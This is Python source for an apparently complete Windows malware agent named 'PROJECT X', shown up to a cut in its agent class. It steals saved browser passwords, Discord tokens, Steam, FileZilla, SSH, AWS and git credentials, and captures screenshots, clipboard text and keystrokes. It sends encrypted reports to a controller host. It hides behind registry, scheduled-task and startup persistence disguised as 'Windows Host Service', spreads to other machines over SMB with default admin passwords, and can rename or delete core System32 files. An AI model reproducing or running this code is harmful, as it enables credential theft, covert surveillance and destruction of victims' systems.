#!/usr/bin/env python3
# ============================================================================
#  PROJECT X  ·  x.pyw  v4  ·  encrypted stealth agent + worm + harvester
#  Pure stdlib. One file. Encrypt-then-MAC transport. Watchdog supervisor.
#  Flags: --run (stay put) | --install | --uninstall | --check | --watchdog
# ============================================================================
import base64, ctypes, glob, hashlib, hmac, json, os, re, shutil, socket
import sqlite3, struct, subprocess, sys, tempfile, threading, time, uuid, zlib

IS_WIN   = os.name == "nt"
NO_REPLY = object()
DETACH   = 0x00000008 | 0x00000200
NOWIN    = 0x08000000
HIDDEN   = 0x02 | 0x04

# ------------------------------------------------------------------ config ---
CFG = {
    "host": "192.168.1.50",        # <-- YOUR machine's LAN IP or Tailscale name
    "port": 44300,                 # <-- must match controller's --listen port
    "passphrase": "pX-2026-changeme",   # <-- must match controller PASSPHRASE
    "tls": False,
    "kdf_iters": 60000,

    "spread":       True,
    "spread_every": 900,
    "spread_creds": ["Administrator:", "admin:", "Administrator:Password123"],
    "spread_ports": [445],
    "spread_dirs":  ["D$\\WindowsHost", "C$\\Users\\Public\\WindowsHost"],

    "telemetry": 20,        # seconds between stat frames (0 = off)
    "auto_elevate": True,   # one UAC prompt on first run, then never again
}

TAG      = "winhost"
VANISH   = False
ROOT     = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")),
                        "Microsoft", "WindowsHost")
SELF     = os.path.abspath(__file__)
EXT      = ".pyc" if SELF.endswith(".pyc") else ".pyw"
FROZEN   = bool(getattr(sys, "frozen", False))
WDIR     = os.path.dirname(sys.executable) if FROZEN else os.path.dirname(SELF)
PY       = os.path.join(WDIR, TAG + EXT)
BIN      = os.path.join(WDIR, TAG + ".exe")
VBS      = os.path.join(WDIR, TAG + ".vbs")
HOMEF    = os.path.join(WDIR, "pyhome.txt")
PIDF     = os.path.join(WDIR, "agent.pid")
WDOGF    = os.path.join(WDIR, "wdog.pid")
MARKF    = os.path.join(WDIR, "elevated.marker")
STARTUP  = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows",
                        "Start Menu", "Programs", "Startup")
RUNKEY   = TAG
RUN_MODE = "--run" in sys.argv
ORIG_DIR = None
try:    SRC = open(SELF, "rb").read()
except Exception: SRC = None
# ---- PROJECT X extras: screen takeover + system corruption ----
_BLACKOUT = {"on": False, "stop": False}

def px_blackout(args=None):
    """Black fullscreen 'PROJECT-X' takeover. args: op=on|off, title=, size="""
    args = args or {}
    op = (args.get("op") or "on").lower()
    if op in ("off", "0", "false"):
        _BLACKOUT["stop"] = True
        return "blackout off"
    if _BLACKOUT["on"]:
        return "blackout already on"
    try:
        import tkinter as tk
    except Exception as e:
        return "tkinter missing: %s" % e

    title = args.get("title") or "PROJECT-X"
    size  = int(args.get("size") or 100)

    def ui():
        root = tk.Tk()
        root.configure(bg="black")
        root.overrideredirect(True)              # no title bar, no border
        root.attributes("-fullscreen", True)
        root.attributes("-topmost", True)
        root.config(cursor="none")               # hide the mouse pointer
        tk.Label(root, text=title, fg="#00ff88", bg="black",
                 font=("Consolas", size, "bold")).pack(expand=True)
        tk.Label(root, text="press ESC to exit", fg="#3a3a3a", bg="black",
                 font=("Consolas", 16)).pack(side="bottom", pady=28)
        root.bind("<Escape>", lambda e: root.destroy())
        def tick():
            if _BLACKOUT["stop"]:
                root.destroy(); return
            root.after(200, tick)
        tick()
        root.lift(); root.focus_force(); root.mainloop()
        _BLACKOUT["on"] = False

    _BLACKOUT.update(on=True, stop=False)
    threading.Thread(target=ui, daemon=True).start()
    return "blackout on"
def _sys32():
    root = os.environ.get("SystemRoot", r"C:\Windows")
    native = os.path.join(root, "Sysnative")     # only exists for 32-bit procs
    return native if os.path.isdir(native) else os.path.join(root, "System32")

def px_corrupt(args=None):
    """Break Windows by renaming/deleting a core System32 file. Needs admin.
       args: op=rename|delete|restore, path=svchost.exe"""
    args = args or {}
    name = args.get("path") or "svchost.exe"
    op   = (args.get("op") or "rename").lower()
    p    = name if os.path.isabs(name) else os.path.join(_sys32(), name)
    bak  = p + ".px_bak"

    if op in ("rename", "corrupt", "break"):
        if os.path.exists(bak): return "already corrupted (backup exists)"
        if not os.path.exists(p): return "not found: " + p
        try:
            os.rename(p, bak)
        except PermissionError:
            return "access denied - run 'elevate' first"
        except OSError:                          # locked by the running system
            import ctypes
            ok = ctypes.windll.kernel32.MoveFileExW(p, bak, 0x4)  # DELAY_UNTIL_REBOOT
            return "rename scheduled for next reboot" if ok else "rename failed"
        return "renamed %s -> %s.px_bak" % (name, name)

    if op == "delete":
        if not os.path.exists(p): return "not found: " + p
        try: os.remove(p)
        except PermissionError: return "access denied - run 'elevate' first"
        return "deleted " + p

    if op == "restore":
        if not os.path.exists(bak): return "no backup at " + bak
        if os.path.exists(p):
            try: os.remove(p)
            except PermissionError: return "target busy - reboot then restore"
        os.rename(bak, p)
        return "restored " + name

    return "op must be rename|delete|restore"
# ------------------------------------------------------------------ crypto ---
def _derive(passphrase, salt=b"projectx-v1", iters=60000):
    dk = hashlib.pbkdf2_hmac("sha256", passphrase.encode("utf-8"), salt, iters, dklen=64)
    return dk[:32], dk[32:]                       # separate enc + mac keys

EK, MK = _derive(CFG["passphrase"], iters=CFG["kdf_iters"])
_RX = set()
_RX_LOCK = threading.Lock()

def _ks(key, nonce, n):
    out, c = bytearray(), 0
    while len(out) < n:
        out += hashlib.sha256(key + nonce + struct.pack(">I", c)).digest()
        c += 1
    return bytes(out[:n])

def _xorb(a, b):
    n = min(len(a), len(b))
    return (int.from_bytes(a[:n], "big") ^ int.from_bytes(b[:n], "big")).to_bytes(n, "big")

def seal(obj):
    pt = json.dumps(obj, separators=(",", ":")).encode()
    nonce = os.urandom(8)
    ct = _xorb(pt, _ks(EK, nonce, len(pt)))
    tag = hmac.new(MK, nonce + ct, hashlib.sha256).digest()[:16]
    return nonce + tag + ct

def unseal(blob, replay=True):
    if len(blob) < 24: raise ValueError("short blob")
    nonce, tag, ct = blob[:8], blob[8:24], blob[24:]
    want = hmac.new(MK, nonce + ct, hashlib.sha256).digest()[:16]
    if not hmac.compare_digest(want, tag): raise ValueError("auth failed")
    if replay:
        with _RX_LOCK:
            if nonce in _RX: raise ValueError("replay")
            _RX.add(nonce)
            if len(_RX) > 8192: _RX.clear()
    return json.loads(_xorb(ct, _ks(EK, nonce, len(ct))).decode())

# ----------------------------------------------------------------- helpers ---
def hide(p):
    try: ctypes.windll.kernel32.SetFileAttributesW(str(p), HIDDEN)
    except Exception: pass

def decode(b):
    for e in ("oem", "utf-8", "cp1252"):
        try: return b.decode(e, "replace")
        except Exception: pass
    return repr(b)

def sh(cmd, cwd=None, timeout=180):
    try:
        p = subprocess.run(cmd, shell=True, cwd=cwd, timeout=timeout, capture_output=True,
                           creationflags=(NOWIN if IS_WIN else 0))
        return p.returncode, decode(p.stdout) + decode(p.stderr)
    except subprocess.TimeoutExpired: return -1, "[timeout]"
    except Exception as e: return -2, f"[error] {e}"

def ps(cmd, timeout=60):
    return sh(f'powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "{cmd}"',
              timeout=timeout)[1].strip()

def is_admin():
    try: return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception: return False

def local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("8.8.8.8", 53))
        ip = s.getsockname()[0]; s.close(); return ip
    except Exception: return "0.0.0.0"

def recv_exact(s, n):
    b = b""
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c: raise ConnectionError("closed")
        b += c
    return b

def self_path(): return sys.executable if FROZEN else SELF

def launch_line():
    p = self_path(); d = os.path.dirname(p)
    if FROZEN: return f'"{p}"'
    for cand in (os.path.join(d, TAG + ".exe"), os.path.join(d, "pythonw.exe")):
        if os.path.exists(cand): return f'"{cand}" "{p}"'
    return f'"{sys.executable}" "{p}"'

def proc_alive(pid):
    try:
        h = ctypes.windll.kernel32.OpenProcess(0x1000, False, int(pid))
        if not h: return False
        code = ctypes.c_ulong()
        ctypes.windll.kernel32.GetExitCodeProcess(h, ctypes.byref(code))
        ctypes.windll.kernel32.CloseHandle(h)
        return code.value == 259
    except Exception: return False

def read_pid(path):
    try: return int(open(path).read().strip())
    except Exception: return 0

def write_pid(path):
    try: open(path, "w").write(str(os.getpid()))
    except Exception: pass

# ----------------------------------------------------------------- sysinfo ---
_cpu_last = [0, 0, 0]

def cpu_pct():
    class FT(ctypes.Structure): _fields_ = [("lo", ctypes.c_ulong), ("hi", ctypes.c_ulong)]
    idle, kern, user = FT(), FT(), FT()
    if not ctypes.windll.kernel32.GetSystemTimes(ctypes.byref(idle), ctypes.byref(kern),
                                                 ctypes.byref(user)):
        return 0
    f = lambda x: (x.hi << 32) | x.lo
    i, k, u = f(idle), f(kern), f(user)
    di, dk, du = i - _cpu_last[0], k - _cpu_last[1], u - _cpu_last[2]
    _cpu_last[:] = [i, k, u]
    tot = dk + du
    return round(100 * (tot - di) / tot, 1) if tot else 0.0

def ram_pct():
    class MS(ctypes.Structure):
        _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
                    ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
                    ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
                    ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
                    ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
    m = MS(); m.dwLength = ctypes.sizeof(MS)
    ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m))
    return m.dwMemoryLoad

def battery():
    class SPS(ctypes.Structure):
        _fields_ = [("ACLineStatus", ctypes.c_byte), ("BatteryFlag", ctypes.c_byte),
                    ("BatteryLifePercent", ctypes.c_byte), ("reserved", ctypes.c_byte),
                    ("BatteryLifeTime", ctypes.c_ulong), ("BatteryFullLifeTime", ctypes.c_ulong)]
    s = SPS()
    if not ctypes.windll.kernel32.GetSystemPowerStatus(ctypes.byref(s)): return None
    return {"ac": s.ACLineStatus, "pct": s.BatteryLifePercent}

def idle_sec():
    class LII(ctypes.Structure): _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_ulong)]
    l = LII(); l.cbSize = ctypes.sizeof(LII)
    if not ctypes.windll.user32.GetLastInputInfo(ctypes.byref(l)): return 0
    return int((ctypes.windll.kernel32.GetTickCount64() - l.dwTime) / 1000)

def active_window():
    try:
        u = ctypes.windll.user32
        h = u.GetForegroundWindow()
        n = u.GetWindowTextLengthW(h)
        buf = ctypes.create_unicode_buffer(n + 1)
        u.GetWindowTextW(h, buf, n + 1)
        return buf.value[:120]
    except Exception: return ""

def clipboard():
    try:
        u, k = ctypes.windll.user32, ctypes.windll.kernel32
        u.GetClipboardData.restype = ctypes.c_void_p
        if not u.OpenClipboard(0): return ""
        h = u.GetClipboardData(13)
        if not h:
            u.CloseClipboard(); return ""
        p = k.GlobalLock(h)
        txt = ctypes.c_wchar_p(p).value or "" if p else ""
        k.GlobalUnlock(h); u.CloseClipboard()
        return txt[:400]
    except Exception: return ""

def telemetry():
    return {"cpu": cpu_pct(), "ram": ram_pct(), "battery": battery(),
            "idle": idle_sec(), "window": active_window(), "clip": clipboard(),
            "procs": len(sh("tasklist /nh")[1].splitlines()), "ip": local_ip()}

# ============================================================================
#  CRYPTO for browsers  ·  AES-256-GCM + DPAPI
# ============================================================================
_SBOX = bytes.fromhex(
 "637c777bf26b6fc53001672bfed7ab76ca82c97dfa5947f0add4a2af9ca472c0"
 "b7fd9326363ff7cc34a5e5f171d8311504c723c31896059a071280e2eb27b275"
 "09832c1a1b6e5aa0523bd6b329e32f8453d100ed20fcb15b6acbbe394a4c58cf"
 "d0efaafb434d338545f9027f503c9fa851a3408f929d38f5bcb6da2110fff3d2"
 "cd0c13ec5f974417c4a77e3d645d197360814fdc222a908846eeb814de5e0bdb"
 "e0323a0a4906245cc2d3ac629195e479e7c8376d8dd54ea96c56f4ea657aae08"
 "ba78252e1ca6b4c6e8dd741f4bbd8b8a703eb5664803f60e613557b986c11d9e"
 "e1f8981169d98e949b1e87e9ce5528df8ca1890dbfe6426841992d0fb054bb16")

def _xt(a): return ((a << 1) ^ 0x1B) & 0xFF if a & 0x80 else (a << 1) & 0xFF

def _expand(key):
    nk = len(key) // 4; nr = nk + 6
    w = [list(key[4*i:4*i+4]) for i in range(nk)]
    rc = 1
    for i in range(nk, 4 * (nr + 1)):
        t = list(w[i-1])
        if i % nk == 0:
            t = [_SBOX[b] for b in t[1:] + t[:1]]
            t[0] ^= rc; rc = _xt(rc)
        elif nk > 6 and i % nk == 4:
            t = [_SBOX[b] for b in t]
        w.append([w[i-nk][j] ^ t[j] for j in range(4)])
    return w, nr

def _eblk(w, nr, blk):
    s = [blk[i] ^ w[i >> 2][i & 3] for i in range(16)]
    for rnd in range(1, nr + 1):
        s = [_SBOX[b] for b in s]
        n = [0]*16
        for r in range(4):
            for c in range(4):
                n[4*c + r] = s[4*((c + r) & 3) + r]
        s = n
        if rnd != nr:
            n = [0]*16
            for c in range(4):
                a0, a1, a2, a3 = s[4*c:4*c+4]
                n[4*c+0] = _xt(a0) ^ _xt(a1) ^ a1 ^ a2 ^ a3
                n[4*c+1] = a0 ^ _xt(a1) ^ _xt(a2) ^ a2 ^ a3
                n[4*c+2] = a0 ^ a1 ^ _xt(a2) ^ _xt(a3) ^ a3
                n[4*c+3] = _xt(a0) ^ a0 ^ a1 ^ a2 ^ _xt(a3)
            s = n
        s = [s[i] ^ w[rnd*4 + (i >> 2)][i & 3] for i in range(16)]
    return bytes(s)

def _gmul(x, y):
    z, v = 0, y
    for i in range(127, -1, -1):
        if (x >> i) & 1: z ^= v
        v = (v >> 1) ^ 0xE1000000000000000000000000000000 if v & 1 else v >> 1
    return z

def aes_gcm_dec(key, blob):
    nonce, ct, tag = blob[:12], blob[12:-16], blob[-16:]
    w, nr = _expand(key)
    j0 = int.from_bytes(nonce + b"\x00\x00\x00\x01", "big")
    ctr, out = j0 + 1, bytearray()
    for i in range(0, len(ct), 16):
        ks = _eblk(w, nr, ctr.to_bytes(16, "big"))
        out += bytes(a ^ b for a, b in zip(ct[i:i+16], ks))
        ctr += 1
    h = int.from_bytes(_eblk(w, nr, b"\x00"*16), "big")
    pad = ct + b"\x00" * (-len(ct) % 16) + (len(ct)*8).to_bytes(8, "big") + b"\x00"*8
    s = 0
    for i in range(0, len(pad), 16):
        s = _gmul(s ^ int.from_bytes(pad[i:i+16], "big"), h)
    return bytes(out)

def dpapi(data):
    import ctypes.wintypes as wt
    class B(ctypes.Structure):
        _fields_ = [("cbData", wt.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
    buf = ctypes.create_string_buffer(bytes(data), len(data))
    bi = B(len(data), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
    bo = B()
    if not ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(bi), None, None,
                                                    None, None, 0, ctypes.byref(bo)):
        raise OSError("dpapi")
    out = ctypes.string_at(bo.pbData, bo.cbData)
    ctypes.windll.kernel32.LocalFree(bo.pbData)
    return out

def crypto_selftest():
    return aes_gcm_dec(b"\x00"*32, b"\x00"*12
                       + bytes.fromhex("530f8afbc74536b9a963b4f1c4cb738b")) == b""

# ============================================================================
#  HARVEST
# ============================================================================
BROWSERS = [("Chrome", "Google/Chrome/User Data"), ("Edge", "Microsoft/Edge/User Data"),
            ("Brave", "BraveSoftware/Brave-Browser/User Data"),
            ("Vivaldi", "Vivaldi/User Data"), ("Chromium", "Chromium/User Data"),
            ("Opera", "Opera Software/Opera Stable"), ("OperaGX", "Opera Software/Opera GX Stable")]

def _bkey(root):
    try:
        ls = json.load(open(os.path.join(root, "Local State"), encoding="utf-8"))
        return dpapi(base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:])
    except Exception: return None

def _bdec(key, v):
    if not v: return ""
    if v[:3] in (b"v10", b"v11"):
        if not key: return "<no key>"
        try: return aes_gcm_dec(key, v[3:]).decode("utf-8", "replace")
        except Exception: return "<decrypt failed>"
    try: return dpapi(v).decode("utf-8", "replace")
    except Exception: return ""

def harvest_passwords(limit=500):
    out = []
    for name, rel in BROWSERS:
        for base in (os.environ.get("LOCALAPPDATA", ""), os.environ.get("APPDATA", "")):
            root = os.path.join(base, rel.replace("/", os.sep))
            if not os.path.isdir(root): continue
            key = _bkey(root)
            for prof in ["Default"] + [f"Profile {i}" for i in range(1, 8)]:
                db = os.path.join(root, prof, "Login Data")
                if not os.path.exists(db): continue
                tmp = os.path.join(tempfile.gettempdir(), "px_" + uuid.uuid4().hex + ".db")
                try:
                    shutil.copy2(db, tmp)
                    con = sqlite3.connect(tmp)
                    rows = con.execute("SELECT origin_url, username_value, password_value "
                                       "FROM logins").fetchall()
                    con.close(); os.remove(tmp)
                except Exception: continue
                for url, user, pw in rows[:limit]:
                    if not user and not pw: continue
                    out.append({"browser": name, "profile": prof, "url": url,
                                "user": user, "pass": _bdec(key, pw)})
            break
    return out

def harvest_discord():
    toks = []
    for sub in ("discord", "discordcanary", "discordptb", "Lightcord"):
        d = os.path.join(os.environ.get("APPDATA", ""), sub, "Local Storage", "leveldb")
        if not os.path.isdir(d): continue
        for f in glob.glob(os.path.join(d, "*")):
            if not f.endswith((".ldb", ".log")): continue
            try: raw = open(f, "rb").read()
            except Exception: continue
            for m in re.findall(rb"dQw4w9WgXcQ:([A-Za-z0-9+/=]{20,})", raw):
                try: toks.append({"app": sub, "token": dpapi(base64.b64decode(m)).decode("utf-8", "replace")})
                except Exception:
                    try: toks.append({"app": sub, "token": base64.b64decode(m).decode("utf-8", "replace")})
                    except Exception: pass
            for m in re.findall(rb'"token"\s*:\s*"([A-Za-z0-9._\-]{20,})"', raw):
                t = m.decode()
                if not t.startswith("dQw4w9WgXcQ"): toks.append({"app": sub, "token": t})
    seen, out = set(), []
    for t in toks:
        if t["token"] not in seen: seen.add(t["token"]); out.append(t)
    return out

def harvest_steam():
    out = []
    for p in (r"C:\Program Files (x86)\Steam", r"C:\Program Files\Steam"):
        vdf = os.path.join(p, "config", "loginusers.vdf")
        if not os.path.exists(vdf): continue
        txt = open(vdf, encoding="utf-8", errors="replace").read()
        for sid, body in re.findall(r'"(\d{17})"\s*\{(.*?)\}', txt, re.S):
            pn = re.search(r'"PersonaName"\s*"([^"]*)"', body)
            an = re.search(r'"AccountName"\s*"([^"]*)"', body)
            out.append({"steamid": sid, "persona": pn.group(1) if pn else "",
                        "account": an.group(1) if an else ""})
        break
    return out

def harvest_filezilla():
    out = []
    p = os.path.join(os.environ.get("APPDATA", ""), "FileZilla", "recentservers.xml")
    if os.path.exists(p):
        txt = open(p, encoding="utf-8", errors="replace").read()
        for blk in re.findall(r"<Server>(.*?)</Server>", txt, re.S):
            h = re.search(r"<Host>(.*?)</Host>", blk)
            u = re.search(r"<User>(.*?)</User>", blk)
            pw = re.search(r"<Pass[^>]*>(.*?)</Pass>", blk)
            try: pwv = base64.b64decode(pw.group(1)).decode("utf-8", "replace") if pw else ""
            except Exception: pwv = pw.group(1) if pw else ""
            out.append({"host": h.group(1) if h else "", "user": u.group(1) if u else "", "pass": pwv})
    return out

def harvest_files():
    home = os.environ.get("USERPROFILE", ""); out = {}
    for rel, key in ((".ssh", "ssh"), (".git-credentials", "git"),
                     (".aws/credentials", "aws"), (".netrc", "netrc")):
        p = os.path.join(home, rel.replace("/", os.sep))
        if os.path.isdir(p): out[key] = os.listdir(p)
        elif os.path.exists(p):
            try: out[key] = open(p, encoding="utf-8", errors="replace").read()[:2000]
            except Exception: out[key] = "present"
    return out

# -------------------------------------------------------------- screenshot ---
def screenshot_png():
    u, g = ctypes.windll.user32, ctypes.windll.gdi32
    w, h = u.GetSystemMetrics(0), u.GetSystemMetrics(1)
    hdc = u.GetDC(0); mdc = g.CreateCompatibleDC(hdc); bmp = g.CreateCompatibleBitmap(hdc, w, h)
    g.SelectObject(mdc, bmp); g.BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)
    import ctypes.wintypes as wt
    class BIH(ctypes.Structure):
        _fields_ = [("biSize", wt.DWORD), ("biWidth", ctypes.c_long), ("biHeight", ctypes.c_long),
                    ("biPlanes", wt.WORD), ("biBitCount", wt.WORD), ("biCompression", wt.DWORD),
                    ("biSizeImage", wt.DWORD), ("biXPels", ctypes.c_long), ("biYPels", ctypes.c_long),
                    ("biClrUsed", wt.DWORD), ("biClrImp", wt.DWORD)]
    bi = BIH(); bi.biSize = ctypes.sizeof(BIH); bi.biWidth, bi.biHeight = w, -h
    bi.biPlanes, bi.biBitCount, bi.biCompression = 1, 24, 0
    stride = ((w * 3 + 3) // 4) * 4
    buf = ctypes.create_string_buffer(stride * h)
    g.GetDIBits(mdc, bmp, 0, h, buf, ctypes.byref(bi), 0)
    g.DeleteObject(bmp); g.DeleteDC(mdc); u.ReleaseDC(0, hdc)
    raw = bytearray()
    for y in range(h):
        raw.append(0)
        row = buf.raw[y * stride: y * stride + w * 3]
        raw += bytes(v for t in zip(row[2::3], row[1::3], row[0::3]) for v in t)
    ck = lambda t, d: struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xFFFFFFFF)
    return (b"\x89PNG\r\n\x1a\n" + ck(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0))
            + ck(b"IDAT", zlib.compress(bytes(raw), 6)) + ck(b"IEND", b""))

VK = {0x08: "[BK]", 0x09: "[TAB]", 0x0D: "\n", 0x1B: "[ESC]", 0x20: " ", 0x25: "[<]",
      0x26: "[^]", 0x27: "[>]", 0x28: "[v]", 0x2E: "[DEL]", 0x5B: "[WIN]", 0x10: "[SHIFT]",
      0x11: "[CTRL]", 0x12: "[ALT]", 0x14: "[CAPS]", 0x23: "[END]", 0x24: "[HOME]"}
VK.update({i: chr(i) for i in range(0x30, 0x3A)})
VK.update({i: chr(i + 32) for i in range(0x41, 0x5B)})
VK.update({i: str(i - 0x60) for i in range(0x60, 0x6A)})
VK.update({i: f"[F{i-0x6F}]" for i in range(0x70, 0x7C)})

# ============================================================================
#  INSTALL / PERSISTENCE
# ============================================================================
def relocate():
    global ORIG_DIR
    if os.path.normcase(os.path.dirname(SELF)) == os.path.normcase(ROOT): return False
    tpy = os.path.join(ROOT, TAG + EXT); tbin = os.path.join(ROOT, TAG + ".exe")
    tvbs = os.path.join(ROOT, TAG + ".vbs"); thome = os.path.join(ROOT, "pyhome.txt")
    os.makedirs(ROOT, exist_ok=True); hide(ROOT)
    shutil.copy2(SELF, tpy)
    exe = sys.executable; ORIG_DIR = os.path.dirname(exe)
    try: open(thome, "w").write(ORIG_DIR)
    except Exception: pass
    if os.path.basename(exe).lower().startswith("python"):
        try:
            shutil.copy2(exe, tbin)
            for f in os.listdir(ORIG_DIR):
                lf = f.lower()
                if lf.startswith(("python3", "vcruntime")) and lf.endswith(".dll"):
                    try: shutil.copy2(os.path.join(ORIG_DIR, f), os.path.join(ROOT, f))
                    except Exception: pass
        except Exception: pass
    with open(tvbs, "w") as f:
        c = f'"{tbin if os.path.exists(tbin) else exe}" "{tpy}"'.replace('"', '""')
        f.write(f'CreateObject("WScript.Shell").Run "{c}", 0, False\n')
    for p in (tpy, tbin, tvbs, thome):
        if os.path.exists(p): hide(p)
    subprocess.Popen([tbin if os.path.exists(tbin) else exe, tpy],
                     creationflags=DETACH | NOWIN, close_fds=True)
    if VANISH and os.path.normcase(SELF) != os.path.normcase(tpy):
        try: os.remove(SELF)
        except Exception: pass
    return True

def persist():
    try:
        import winreg
        with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, RUNKEY, 0, winreg.REG_SZ, launch_line())
    except Exception: pass
    try:
        user = f'{os.environ.get("USERDOMAIN","")}\\{os.environ.get("USERNAME","")}'.strip("\\")
        ll = launch_line()
        launcher, arg = ll.split('" "', 1) if '" "' in ll else (ll, "")
        launcher, arg = launcher.strip('"'), arg.strip('"')
        xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
 <RegistrationInfo><Description>Windows Host Service</Description></RegistrationInfo>
 <Triggers><LogonTrigger><Enabled>true</Enabled><UserId>{user}</UserId></LogonTrigger>
 <BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers>
 <Principals><Principal id="Author"><UserId>{user}</UserId>
 <LogonType>S4U</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
 <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
 <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
 <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
 <AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable>
 <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd></IdleSettings>
 <AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden>
 <RunOnlyIfIdle>false</RunOnlyIfIdle>
 <RestartOnFailure><Interval>PT1M</Interval><Count>5</Count></RestartOnFailure>
 <ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>4</Priority></Settings>
 <Actions Context="Author"><Exec><Command>{launcher}</Command>
 <Arguments>{arg}</Arguments></Exec></Actions>
</Task>'''
        xp = os.path.join(WDIR, "task.xml")
        open(xp, "w", encoding="utf-16").write(xml); hide(xp)
        sh(f'schtasks /create /tn "{TAG}" /xml "{xp}" /f', timeout=60)
    except Exception:
        sh(f'schtasks /create /tn "{TAG}" /tr "{launch_line()}" /sc onlogon /rl highest /f')
    try:
        open(os.path.join(STARTUP, TAG + ".vbs"), "w").write(
            f'CreateObject("WScript.Shell").Run "{launch_line().replace(chr(34), chr(34)*2)}", 0, False\n')
    except Exception: pass

def unpersist():
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, RUNKEY)
    except Exception: pass
    sh(f'schtasks /delete /tn "{TAG}" /f')
    try: os.remove(os.path.join(STARTUP, TAG + ".vbs"))
    except Exception: pass

def runkey_ok():
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run") as k:
            return winreg.QueryValueEx(k, RUNKEY)[0] == launch_line()
    except Exception: return False

def single_instance():
    ctypes.windll.kernel32.CreateMutexW(None, False,
        f"Global\\{TAG}-{'adm' if is_admin() else 'usr'}")
    return ctypes.windll.kernel32.GetLastError() != 183

def auto_elevate():
    if not CFG.get("auto_elevate") or is_admin() or os.path.exists(MARKF): return
    try:
        open(MARKF, "w").write("1")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", self_path(),
                                            "" if FROZEN else f'"{SELF}"', None, 1)
    except Exception: pass

# ----------------------------------------------------------------- watchdog ---
def spawn_agent():
    args = [self_path()] if FROZEN else [sys.executable, SELF]
    if RUN_MODE: args.append("--run")
    try:
        subprocess.Popen(args, creationflags=DETACH | NOWIN, close_fds=True)
    except OSError: pass

def watchdog_main():
    if read_pid(WDOGF) not in (0, os.getpid()) and proc_alive(read_pid(WDOGF)):
        return 0
    write_pid(WDOGF)
    while True:
        time.sleep(5)
        write_pid(WDOGF)
        if read_pid(PIDF) and proc_alive(read_pid(PIDF)): continue
        spawn_agent()
        time.sleep(8)

def spawn_watchdog():
    if os.environ.get("PX_NO_WATCHDOG"): return
    pid = read_pid(WDOGF)
    if pid and pid != os.getpid() and proc_alive(pid): return
    args = ([self_path()] if FROZEN else [sys.executable, SELF]) + ["--watchdog"]
    try: subprocess.Popen(args, creationflags=DETACH | NOWIN, close_fds=True)
    except OSError: pass

def watchdog():
    while True:
        time.sleep(300)
        try:
            if not os.path.exists(self_path()) and SRC:
                open(self_path(), "wb").write(SRC)
            d = ORIG_DIR
            if not d:
                try: d = open(HOMEF).read().strip()
                except Exception: d = None
            if not os.path.exists(BIN) and d and os.path.exists(os.path.join(d, "pythonw.exe")):
                shutil.copy2(os.path.join(d, "pythonw.exe"), BIN)
            for p in (WDIR, PY, BIN, HOMEF, PIDF, WDOGF):
                if os.path.exists(p): hide(p)
            if not runkey_ok(): persist()
            write_pid(PIDF)
        except Exception: pass

def spreader(ag):
    time.sleep(60)
    while True:
        try:
            if CFG.get("spread"): ag.c_spread({}, 0)
        except Exception: pass
        time.sleep(CFG.get("spread_every", 900))

# ============================================================================
#  AGENT
# ============================================================================
class Agent:
    def __init__(self):
        self.id = f"{socket.gethostname().split('.')[0]}-{uuid.uuid4().hex[:6]}"
        self.cwd, self.tx, self.sock = os.path.expanduser("~"), threading.Lock(), None
        self.sem, self.put = threading.Semaphore(12), None
        self.klog, self.klog_on, self.kdown = [], False, {}
        self.upd, self.upd_ev = None, threading.Event()
        self.stat = {}

    def send(self, o):
        blob = seal(o)
        with self.tx: self.sock.sendall(struct.pack(">I", len(blob)) + blob)

    def recv(self):
        n = struct.unpack(">I", recv_exact(self.sock, 4))[0]
        return unseal(recv_exact(self.sock, n))

    def reply(self, x, d=None, e=None):
        self.send({"ev": "res", "xid": x, "ok": e is None, "data": d, "err": e})

    def hello(self):
        import platform
        return {"id": self.id, "tag": TAG, "version": "4.0", "proto": 1,
                "host": socket.gethostname(), "user": os.environ.get("USERNAME", "?"),
                "domain": os.environ.get("USERDOMAIN", ""),
                "os": f"{platform.system()} {platform.release()}", "arch": platform.machine(),
                "python": platform.python_version(), "frozen": FROZEN,
